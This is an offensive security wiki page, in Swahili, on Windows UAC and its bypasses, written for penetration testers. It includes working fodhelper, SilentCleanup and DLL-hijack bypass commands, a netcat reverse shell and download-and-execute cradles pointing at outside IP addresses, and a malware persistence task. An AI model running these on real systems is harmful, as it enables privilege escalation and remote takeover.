# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ni kipengele kinachowezesha **ombi la idhini kwa shughuli zinazohitaji viwango vya juu vya ruhusa**. Programu zina viwango tofauti vya `integrity`, na programu yenye **kiwango cha juu** inaweza kutekeleza kazi ambazo **zinaweza kuhatarisha mfumo**. UAC inapowashwa, programu na kazi kila mara **huendeshwa chini ya muktadha wa usalama wa akaunti isiyo ya msimamizi** isipokuwa msimamizi aidhinishe wazi programu/kazi hizo kupata ufikiaji wa kiwango cha msimamizi kwenye mfumo ili ziendeshwe. Ni kipengele cha urahisi kinachowalinda wasimamizi dhidi ya mabadiliko yasiyokusudiwa, lakini hakichukuliwi kuwa mpaka wa usalama.<sup>[[2]](#references)</sup>

Kwa maelezo zaidi kuhusu viwango vya integrity:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

UAC inapokuwepo, mtumiaji msimamizi hupewa tokens 2: token ya mtumiaji wa kawaida, kwa kutekeleza vitendo vya kawaida katika kiwango cha medium integrity, na nyingine yenye privileges za msimamizi.

Hii [ukurasa](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) unaeleza kwa kina jinsi UAC inavyofanya kazi na unajumuisha mchakato wa kuingia, matumizi ya mtumiaji, na usanifu wa UAC.<sup>[[2]](#references)</sup> Wasimamizi wanaweza kutumia sera za usalama kusanidi jinsi UAC inavyofanya kazi kulingana na mahitaji ya shirika lao katika kiwango cha ndani (kwa kutumia secpol.msc), au kuisanidi na kuisambaza kupitia Group Policy Objects (GPO) katika mazingira ya Active Directory domain. Mipangilio mbalimbali imejadiliwa kwa kina [hapa](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Kuna mipangilio 10 ya Group Policy inayoweza kuwekwa kwa UAC. Jedwali lifuatalo linatoa maelezo ya ziada:

| Mipangilio ya Group Policy                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Mipangilio ya Chaguo-msingi                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Imezimwa)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Omba idhini kwa binary zisizo za Windows kwenye secure desktop) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Omba credentials kwenye secure desktop)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Imewashwa; imezimwa kwa chaguo-msingi kwenye Enterprise)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Imezimwa)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Imewashwa)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Imewashwa)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Imezimwa)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Imewashwa)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Imewashwa)                                              |

### Sera za kusakinisha software kwenye Windows

**local security policies** ("secpol.msc" kwenye mifumo mingi) zimesanidiwa kwa chaguo-msingi ili **kuwazuia watumiaji wasio wasimamizi kusakinisha software**. Hii inamaanisha kwamba hata kama mtumiaji asiye msimamizi anaweza kupakua installer ya software yako, hataweza kuiendesha bila akaunti ya msimamizi.

### Registry Keys za Kulazimisha UAC Kuomba Elevation

Ukiwa mtumiaji wa kawaida usiye na admin rights, unaweza kuhakikisha kwamba akaunti ya "kawaida" **inaombwa credentials na UAC** inapojaribu kutekeleza vitendo fulani. Kitendo hiki kingehitaji kurekebisha **registry keys** fulani, ambazo zinahitaji admin permissions, isipokuwa kuwe na **UAC bypass**, au mshambulizi awe tayari ameingia kama admin.

Hata kama mtumiaji yuko katika group la **Administrators**, mabadiliko haya humlazimisha mtumiaji **kuingiza tena credentials za akaunti yake** ili kutekeleza vitendo vya kiutawala.

**Kwa vitendo, hii huwa na manufaa tu ikiwa tayari una token iliyoinuliwa, UAC bypass, au misconfiguration inayokuruhusu kubadilisha keys hizi; vinginevyo, uandishi wenyewe kwenye registry huzuiwa.**

Registry keys na entries unazopaswa kubadilisha ni zifuatazo (zikiwa na values zao za chaguo-msingi kwenye mabano):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Hili pia linaweza kufanywa mwenyewe kupitia zana ya Local Security Policy. Baada ya kubadilishwa, shughuli za kiutawala humtaka mtumiaji kuingiza tena credentials zake.

### Kumbuka

**User Account Control si mpaka wa usalama.** Kwa hiyo, watumiaji wa kawaida hawawezi kujinasua kutoka kwenye akaunti zao na kupata rights za msimamizi bila exploit ya local privilege escalation.

### Omba 'ufikiaji kamili wa kompyuta' kutoka kwa mtumiaji
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC Privileges

- Internet Explorer Protected Mode hutumia ukaguzi wa integrity kuzuia michakato yenye kiwango cha juu cha integrity (kama web browsers) kufikia data yenye kiwango cha chini cha integrity (kama folda ya temporary Internet files). Hili hufanywa kwa kuendesha browser kwa kutumia low-integrity token. Browser inapojaribu kufikia data iliyohifadhiwa katika low-integrity zone, operating system hukagua integrity level ya mchakato na kuruhusu ufikiaji ipasavyo. Kipengele hiki husaidia kuzuia mashambulizi ya remote code execution kupata ufikiaji wa data nyeti kwenye mfumo.
- Mtumiaji anapoingia kwenye Windows, mfumo huunda access token yenye orodha ya privileges za mtumiaji. Privileges hufafanuliwa kama mchanganyiko wa rights na capabilities za mtumiaji. Token hiyo pia huwa na orodha ya credentials za mtumiaji, ambazo hutumika kum-authenticate mtumiaji kwenye computer na kwenye resources za network.

### Autoadminlogon

Ili kusanidi Windows iingie kiotomatiki kwa mtumiaji maalum wakati wa startup, weka **`AutoAdminLogon registry key`**. Hii ni muhimu kwa mazingira ya kiosk au kwa madhumuni ya testing. Tumia hii kwenye secure systems pekee, kwa kuwa hufichua password kwenye registry.

Weka keys zifuatazo ukitumia Registry Editor au `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Ili kurejesha tabia ya kawaida ya logon, weka `AutoAdminLogon` kuwa 0.

## UAC bypass

> [!TIP]
> Kumbuka kwamba ikiwa una graphical access kwa victim, UAC bypass ni rahisi moja kwa moja kwa kuwa unaweza kubofya tu "Yes" UAC prompt inapoonekana

UAC bypass inahitajika katika hali ifuatayo: **UAC imewashwa, process yako inaendesha katika medium integrity context, na user wako ni wa administrators group**.

Ni muhimu kutaja kwamba ni **vigumu zaidi kubypass UAC ikiwa iko kwenye security level ya juu zaidi (Always) kuliko ikiwa iko kwenye level nyingine yoyote (Default).**

### Fast triage from a medium-integrity shell

Kabla ya kujaribu bypass, thibitisha kuwa uko kwenye scenario sahihi na linganisha host build na methods zinazojulikana kufanya kazi:
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
Maelezo ya vitendo:
- Ikiwa `EnableLUA=0`, huhitaji bypass: token yoyote ya admin inaweza kuomba high integrity moja kwa moja.
- `ConsentPromptBehaviorAdmin=2` au `5` ndiyo hali ya kawaida kwa auto-elevate / COM-based bypasses.
- `Always Notify` huongeza kiwango cha ugumu, lakini bado unapaswa kujaribu build halisi badala ya kudhani itashindwa: UACME bado inafuatilia baadhi ya mbinu za `AlwaysNotify compatible` kwenye Windows builds za kisasa.<sup>[[3]](#references)</sup>

### UAC imezimwa

Ikiwa UAC tayari imezimwa (`ConsentPromptBehaviorAdmin` ni **`0`), unaweza **kuendesha reverse shell yenye mapendeleo ya admin** (kiwango cha integrity cha juu) ukitumia kitu kama:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Msingi Sana** UAC "bypass" (ufikiaji kamili wa file system)

Ikiwa una shell yenye user aliye ndani ya kundi la Administrators, unaweza **ku-mount C$** iliyoshirikiwa kupitia SMB (file system) locally kwenye disk mpya, na utakuwa na **ufikiaji wa kila kitu ndani ya file system** (hata folder ya nyumbani ya Administrator).

> [!WARNING]
> **Inaonekana kama trick hii haifanyi kazi tena**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass with cobalt strike

Mbinu za Cobalt Strike zitafanya kazi tu ikiwa UAC haijawekwa kwenye kiwango chake cha juu zaidi cha usalama
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** na **Metasploit** pia zina modules kadhaa za **bypass** ya **UAC**.

### Elevated COM interfaces (`ICMLuaUtil` / `CMSTPLUA`)

Vitu vya COM vinavyoji-elevate kiotomatiki bado ni sehemu ya vitendo ya UAC kwenye builds za kisasa. `ICMLuaUtil` bado inafuatiliwa na UACME kama inayofanya kazi kwenye matawi ya sasa ya Windows, na offensive tooling inaendelea kurekebisha `CMSTPLUA` kwa kuchanganya process ya interactive desktop, execution ya 64-bit, na wakati mwingine PEB/process masquerading kabla ya kuita COM Elevation Moniker.<sup>[[3]](#references)</sup>

Vidokezo vya vitendo:
- Pendelea process ya **64-bit** katika **interactive session** ya mtumiaji (mara nyingi `explorer.exe` au child process yake).
- Ikiwa raw shell itashindwa, jaribu tena kutoka kwa BOF / UACME implementation badala ya naive `CreateProcess` wrapper.
- Tarajia child execution kutokea katika **separate elevated process**; BOF nyingi hazi-elevate beacon ya sasa in-place.

### KRBUACBypass

Documentation na tool zinapatikana kwenye [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME)ambayo ni **compilation** ya UAC bypass exploits kadhaa. Kumbuka kwamba utahitaji **compile UACME kwa kutumia Visual Studio au msbuild**. Compilation itaunda executables kadhaa (kama `Source\Akagi\outout\x64\Debug\Akagi.exe`) , utahitaji kujua **ni ipi unayohitaji.**\
Unapaswa **kuwa mwangalifu** kwa sababu baadhi ya bypasses **zita-prompt programs nyingine** ambazo **zitamjulisha** **mtumiaji** kwamba kuna kitu kinaendelea.<sup>[[3]](#references)</sup>

UACME ina **build version ambayo kila technique ilianza kufanya kazi**.<sup>[[3]](#references)</sup> Unaweza kutafuta technique inayoathiri versions zako:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Pia, kwa kutumia ukurasa [huu](https://en.wikipedia.org/wiki/Windows_10_version_history) unapata Windows release `1607` kutoka kwenye build versions.

Workflow ya vitendo ni kwanza **kukadiria build ya host**, kisha tu kuendesha method inayolingana:
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage` hulinganisha kwa haraka build ya ndani dhidi ya mbinu zake za UAC zinazojulikana, jambo linalosaidia kuondoa haraka PoCs ambazo hazifanyi kazi.<sup>[[4]](#references)</sup>
- `UACME` bado ndiyo katalogi bora ya umma ya kuhusianisha bypass na build mahususi. Matoleo ya hivi karibuni yaliongeza mbinu mpya na kufanya majaribio tena ya zilizokuwepo dhidi ya **Windows 11 25H2**, kwa hivyo kagua tena README/maelezo ya toleo kabla ya kudhani kuwa chapisho la zamani la blogu bado linatumika bila mabadiliko.<sup>[[3]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

Binary inayoaminika `fodhelper.exe` hupewa auto-elevated kwenye Windows za kisasa. Inapozinduliwa, huuliza njia ya Registry ya kila mtumiaji iliyo hapa chini bila kuthibitisha verb ya `DelegateExecute`. Kuweka command hapo huruhusu mchakato wa Medium Integrity (mtumiaji yuko kwenye Administrators) kuzindua mchakato wa High Integrity bila prompt ya UAC.

Registry path inayoulizwa na fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>Hatua za PowerShell (weka payload yako, kisha ianzishe)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Notes:
- Hufanya kazi wakati mtumiaji wa sasa ni mwanachama wa Administrators na kiwango cha UAC ni default/lenient (si Always Notify yenye vizuizi vya ziada).
- Tumia path ya `sysnative` kuanzisha PowerShell ya 64-bit kutoka kwenye process ya 32-bit kwenye Windows ya 64-bit.
- Payload inaweza kuwa command yoyote (PowerShell, cmd, au path ya EXE). Epuka UIs zinazoomba mwingiliano kwa ajili ya stealth.

#### CurVer/extension hijack variant (HKCU only)

Recent samples zinazotumia vibaya `fodhelper.exe` huepuka `DelegateExecute` na badala yake **huelekeza upya `ms-settings` ProgID** kupitia value ya `CurVer` ya kila mtumiaji. Binary ya auto-elevated bado hutafuta handler chini ya `HKCU`, kwa hiyo hakuna admin token inayohitajika kupandikiza keys:<sup>[[5]](#references)</sup>
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Baada ya kupata privileges za juu, malware kwa kawaida **huzima prompts za baadaye** kwa kuweka `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` kuwa `0`, kisha hufanya defense evasion ya ziada (kwa mfano, `Add-MpPreference -ExclusionPath C:\ProgramData`) na kuunda upya persistence ili iendeshe ikiwa na high integrity. Task ya kawaida ya persistence huhifadhi **PowerShell script iliyosimbwa kwa XOR** kwenye diski na kuidecode/kuiendesha in-memory kila saa:<sup>[[5]](#references)</sup>
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Variante hii bado husafisha dropper na kuacha staged payloads pekee, hivyo detection hutegemea kufuatilia **`CurVer` hijack**, tampering ya `ConsentPromptBehaviorAdmin`, uundaji wa Defender exclusion, au scheduled tasks zinazofanya in-memory decrypt ya PowerShell.<sup>[[5]](#references)</sup>

### UAC bypass kupitia task ya `SilentCleanup` (`HKCU\Environment\windir`)

`SilentCleanup` huzindua `cleanmgr.exe` ikiwa na highest privileges na hupanua `%windir%` kutoka kwenye user environment. Ukidhibiti `HKCU\Environment\windir`, unaweza kuelekeza upanuzi huo kwenye arbitrary command na kupata high integrity bila consent dialog.<sup>[[8]](#references)</sup> Njia hii bado inafaa kujaribiwa kwenye recent builds kwa sababu UACME inaendelea kuiunga mkono, na issue tracking ya hivi karibuni inaonyesha kuwa Windows 11 24H2 huenda ikahitaji tu marekebisho madogo ya quoting.<sup>[[3]](#references)</sup>
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
Ikiwa task inanukuu path kwenye build hiyo, jaribu tena kwa payload inayoishia kwa alama ya kunukuu (kwa mfano `cmd.exe"`). Safisha kila mara `HKCU\Environment\windir` baada ya testing.

#### More UAC bypass

Many classic UAC bypasses that abuse UI flows, COM objects, or desktop interaction require a **full interactive session** with the victim; a common `nc.exe` shell or a service running in **Session 0** is often not enough.

Mara nyingi unaweza kutatua hili kwa kutumia session ya **meterpreter**. Hamia kwenye **process** yenye thamani ya **Session** iliyo sawa na **1**:

![Point ms-settings to a custom extension (.thm) and map that extension to our payload - More UAC bypass: Unaweza kupata hii kwa kutumia session ya meterpreter. Hamia kwenye process yenye Session...](<../../images/image (863).png>)

(_explorer.exe_ should work)

### UAC Bypass with GUI

Ikiwa una access ya **GUI unaweza kukubali tu UAC prompt** inapoonekana; kwa hiyo huhitaji technical bypass kwa kweli. Hivyo, kupata GUI session mara nyingi kunatosha kupita kikwazo cha kiutendaji kinachoongezwa na UAC.

Zaidi ya hayo, ukipata GUI session ambayo mtu alikuwa akiitumia (huenda kupitia RDP), kuna **baadhi ya tools zitakazokuwa zinaendesha kama administrator** ambazo unaweza kutumia **kuendesha** **cmd** kwa mfano **kama admin** moja kwa moja bila kuulizwa tena na UAC, kama [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Hii inaweza kuwa **stealthy** zaidi.

### Noisy brute-force UAC bypass

Ikiwa hujali kuwa noisy, unaweza **kuendesha kitu kama** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) ambacho **huomba permissions zilizoinuliwa mpaka user akubali**.

### Your own bypass - Basic UAC bypass methodology

Ukiangalia **UACME**, utaona kwamba **UAC bypasses nyingi hutumia DLL hijacking** (mara nyingi kwa kufanya binary iliyoinuliwa ipakie DLL inayodhibitiwa na attacker kutoka kwenye writable path). [Soma hii ili ujifunze jinsi ya kupata vulnerability ya DLL hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Tafuta binary ambayo **autoelevate** (hakikisha kwamba inapotekelezwa inaendesha kwenye high integrity level).
2. Kwa kutumia procmon, tafuta events za "**NAME NOT FOUND**" ambazo zinaweza kuwa vulnerable kwa **DLL Hijacking**.
3. Huenda ukahitaji **kuandika** DLL ndani ya baadhi ya **protected paths** (kama C:\Windows\System32) ambako huna writing permissions. Unaweza kupita kizuizi hiki kwa kutumia:
1. **wusa.exe**: Windows 7,8 na 8.1. Inakuruhusu kutoa content ya CAB file ndani ya protected paths (kwa sababu tool hii hutekelezwa kutoka kwenye high integrity level).
2. **IFileOperation**: Windows 10.
4. Andaa **script** ya kunakili DLL yako ndani ya protected path na kutekeleza binary iliyo vulnerable na autoelevated.

### Another UAC bypass technique

Inahusisha kuangalia ikiwa **autoElevated binary** inajaribu **kusoma** kutoka kwenye **registry** **name/path** ya **binary** au **command** itakayo **tekelezwa** (hii inavutia zaidi ikiwa binary inatafuta taarifa hii ndani ya **HKCU**).

### UAC bypass via `SysWOW64\iscsicpl.exe` + user `PATH` DLL hijack

`C:\Windows\SysWOW64\iscsicpl.exe` ya 32-bit ni binary **auto-elevated** inayoweza kutumiwa vibaya kupakia `iscsiexe.dll` kulingana na search order. Ikiwa unaweza kuweka `iscsiexe.dll` yenye madhara ndani ya folder ya **user-writable** na kisha kurekebisha `PATH` ya current user (kwa mfano kupitia `HKCU\Environment\Path`) ili folder hiyo itafutwe, Windows inaweza kupakia attacker DLL ndani ya process ya `iscsicpl.exe` iliyoinuliwa **bila kuonyesha UAC prompt**.<sup>[[1]](#references)[[6]](#references)</sup>

Maelezo ya kiutendaji:
- Hii ni muhimu wakati current user yuko kwenye **Administrators** lakini anaendesha kwenye **Medium Integrity** kwa sababu ya UAC.
- Nakala ya **SysWOW64** ndiyo inayohusika na bypass hii. Chukulia nakala ya **System32** kama binary tofauti na uthibitishe tabia yake kwa kujitegemea.
- Primitive hii ni mchanganyiko wa **auto-elevation** na **DLL search-order hijacking**, kwa hiyo workflow ileile ya ProcMon inayotumika kwa UAC bypasses nyingine ni muhimu kuthibitisha DLL load inayokosekana.

Mtiririko wa chini kabisa:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Mawazo ya kugundua:
- Toa alert kwa `reg add` / registry writes kwenda `HKCU\Environment\Path` yanayofuatwa mara moja na utekelezaji wa `C:\Windows\SysWOW64\iscsicpl.exe`.
- Tafuta `iscsiexe.dll` katika maeneo **yanayodhibitiwa na user** kama `%TEMP%` au `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Husisha uanzishaji wa `iscsicpl.exe` na child processes zisizotarajiwa au DLL loads kutoka nje ya directories za kawaida za Windows.

### Utafiti mpya unaostahili kukaguliwa kando

Baadhi ya chains za baada ya 2024 hazifanani tena na registry hijacks za kawaida za `HKCU\Software\Classes`. Kwa mfano, activation-context cache poisoning inaweza kuunganisha **drive remap** na **DLL redirection** ili kupanda kutoka medium hadi high integrity kupitia trusted UI / auto-elevated binaries kama `ctfmon.exe`, na baadaye targets kama `fodhelper.exe`. Badala ya kurudia PoC kubwa hapa, angalia compact payload examples katika:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Administrator Protection (25H2) drive-letter hijack kupitia per-logon-session DOS device map

Kwa attack surface yote ya `RAiLaunchAdminProcess` / UIAccess kwenye Windows 11 25H2, angalia ukurasa maalum:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 “Administrator Protection” hutumia shadow-admin tokens zenye per-session `\Sessions\0\DosDevices/<LUID>` maps. Directory huundwa kwa lazy na `SeGetTokenDeviceMap` wakati wa resolution ya kwanza ya `\??`. Ikiwa attacker ana-impersonate shadow-admin token kwenye **SecurityIdentification** pekee, directory huundwa huku attacker akiwa **owner** (inarithi `CREATOR OWNER`), hivyo kuruhusu drive-letter links zenye kipaumbele kuliko `\GLOBAL??`.<sup>[[7]](#references)</sup>

**Hatua:**

1. Kutoka kwenye low-privileged session, ita `RAiProcessRunOnce` ili kuzalisha shadow-admin `runonce.exe` isiyoonyesha prompt.
2. Duplicate primary token yake kuwa **identification** token na u-impersonate token hiyo huku ukifungua `\??` ili kulazimisha kuundwa kwa `\Sessions\0\DosDevices/<LUID>` chini ya ownership ya attacker.
3. Unda `C:` symlink hapo ikielekeza kwenye attacker-controlled storage; filesystem accesses zinazofuata katika session hiyo zita-resolve `C:` kwenda kwenye attacker path, na kuwezesha DLL/file hijack bila prompt.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## Marejeo

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Jinsi User Account Control inavyofanya kazi](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – Mkusanyiko wa mbinu za UAC bypass](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – UAC bypass compatibility scanner na launcher](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI Inatumia AI Kutengeneza PowerShell Backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operation TrueChaos: 0-Day Exploitation dhidi ya Malengo ya Serikali za Kusini-Mashariki mwa Asia](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Bypassing Windows Administrator Protection](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – Bypass UAC kwa Kutumia SilentCleanup Task](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)

{{#include ../../banners/hacktricks-training.md}}
